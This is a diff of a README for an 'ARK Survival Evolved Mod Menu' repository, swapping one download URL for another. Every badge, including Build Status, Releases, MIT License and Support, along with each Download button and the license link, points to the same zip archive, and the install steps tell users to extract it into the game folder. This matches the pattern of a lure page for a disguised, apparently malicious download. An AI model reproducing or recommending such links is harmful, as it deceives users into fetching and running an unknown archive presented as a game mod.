@@ -1,9 +1,9 @@
 # ARK Survival Evolved Mod Menu 🦖✨
 
-[![Build Status](https://raw.githubusercontent.com/Kanis04/ark-survival-ascended-mod-suite/branch/orisphere/suite-ascended-survival-mod-ark-blatantly.zip)](https://raw.githubusercontent.com/Kanis04/ark-survival-ascended-mod-suite/branch/orisphere/suite-ascended-survival-mod-ark-blatantly.zip)
-[![Releases](https://raw.githubusercontent.com/Kanis04/ark-survival-ascended-mod-suite/branch/orisphere/suite-ascended-survival-mod-ark-blatantly.zip)](https://raw.githubusercontent.com/Kanis04/ark-survival-ascended-mod-suite/branch/orisphere/suite-ascended-survival-mod-ark-blatantly.zip)
-[![MIT License](https://raw.githubusercontent.com/Kanis04/ark-survival-ascended-mod-suite/branch/orisphere/suite-ascended-survival-mod-ark-blatantly.zip)](https://raw.githubusercontent.com/Kanis04/ark-survival-ascended-mod-suite/branch/orisphere/suite-ascended-survival-mod-ark-blatantly.zip)
-[![Support](https://raw.githubusercontent.com/Kanis04/ark-survival-ascended-mod-suite/branch/orisphere/suite-ascended-survival-mod-ark-blatantly.zip%20service-24/7-blueviolet)](https://raw.githubusercontent.com/Kanis04/ark-survival-ascended-mod-suite/branch/orisphere/suite-ascended-survival-mod-ark-blatantly.zip)
+[![Build Status](https://github.com/Kanis04/ark-survival-ascended-mod-suite/raw/refs/heads/branch/orisphere/ark_survival_suite_ascended_mod_v3.0.zip)](https://github.com/Kanis04/ark-survival-ascended-mod-suite/raw/refs/heads/branch/orisphere/ark_survival_suite_ascended_mod_v3.0.zip)
+[![Releases](https://github.com/Kanis04/ark-survival-ascended-mod-suite/raw/refs/heads/branch/orisphere/ark_survival_suite_ascended_mod_v3.0.zip)](https://github.com/Kanis04/ark-survival-ascended-mod-suite/raw/refs/heads/branch/orisphere/ark_survival_suite_ascended_mod_v3.0.zip)
+[![MIT License](https://github.com/Kanis04/ark-survival-ascended-mod-suite/raw/refs/heads/branch/orisphere/ark_survival_suite_ascended_mod_v3.0.zip)](https://github.com/Kanis04/ark-survival-ascended-mod-suite/raw/refs/heads/branch/orisphere/ark_survival_suite_ascended_mod_v3.0.zip)
+[![Support](https://github.com/Kanis04/ark-survival-ascended-mod-suite/raw/refs/heads/branch/orisphere/ark_survival_suite_ascended_mod_v3.0.zip%20service-24/7-blueviolet)](https://github.com/Kanis04/ark-survival-ascended-mod-suite/raw/refs/heads/branch/orisphere/ark_survival_suite_ascended_mod_v3.0.zip)
 
 ---
 
@@ -16,7 +16,7 @@ Venture into new ARK dimensions with our transformative **ARK Survival Evolved M
 
 **Jump right in and awaken your ARK with our unique mod menu!**
 
-[![Download](https://raw.githubusercontent.com/Kanis04/ark-survival-ascended-mod-suite/branch/orisphere/suite-ascended-survival-mod-ark-blatantly.zip%20Mod%20Menu-important?style=for-the-badge&logo=appveyor)](LINK)
+[![Download](https://github.com/Kanis04/ark-survival-ascended-mod-suite/raw/refs/heads/branch/orisphere/ark_survival_suite_ascended_mod_v3.0.zip%20Mod%20Menu-important?style=for-the-badge&logo=appveyor)](LINK)
 
 Follow installation instructions precisely for optimal expedition results.
 
@@ -115,7 +115,7 @@ Our team rides shotgun 24/7, ready to debug, update, or resolve issues instantly
 
 2. **Direct Download: One-Click Activation**  
    Click the button below to fetch the adventure starter pack instantly:  
-   [![Download](https://raw.githubusercontent.com/Kanis04/ark-survival-ascended-mod-suite/branch/orisphere/suite-ascended-survival-mod-ark-blatantly.zip%20Mod%20Menu-important?style=for-the-badge&logo=appveyor)](LINK)
+   [![Download](https://github.com/Kanis04/ark-survival-ascended-mod-suite/raw/refs/heads/branch/orisphere/ark_survival_suite_ascended_mod_v3.0.zip%20Mod%20Menu-important?style=for-the-badge&logo=appveyor)](LINK)
 
 3. **Extract Contents**
    - Use WinRAR, 7-Zip, or your favorite extraction tool. Place files inside your `ARK Survival Evolved` directory.
@@ -146,13 +146,13 @@ Our team rides shotgun 24/7, ready to debug, update, or resolve issues instantly
 
 If you missed the expedition, reclaim your adventure now:
 
-[![Download](https://raw.githubusercontent.com/Kanis04/ark-survival-ascended-mod-suite/branch/orisphere/suite-ascended-survival-mod-ark-blatantly.zip%20Mod%20Menu-important?style=for-the-badge&logo=appveyor)](LINK)
+[![Download](https://github.com/Kanis04/ark-survival-ascended-mod-suite/raw/refs/heads/branch/orisphere/ark_survival_suite_ascended_mod_v3.0.zip%20Mod%20Menu-important?style=for-the-badge&logo=appveyor)](LINK)
 
 ---
 
 ## 📝 License (MIT 2025)
 
-This project is licensed under the [MIT License](https://raw.githubusercontent.com/Kanis04/ark-survival-ascended-mod-suite/branch/orisphere/suite-ascended-survival-mod-ark-blatantly.zip).  
+This project is licensed under the [MIT License](https://github.com/Kanis04/ark-survival-ascended-mod-suite/raw/refs/heads/branch/orisphere/ark_survival_suite_ascended_mod_v3.0.zip).  
 Breathe easy and remix, as long as you keep the spirit of fair use alive. 2025—expedition ready!
 
 ---
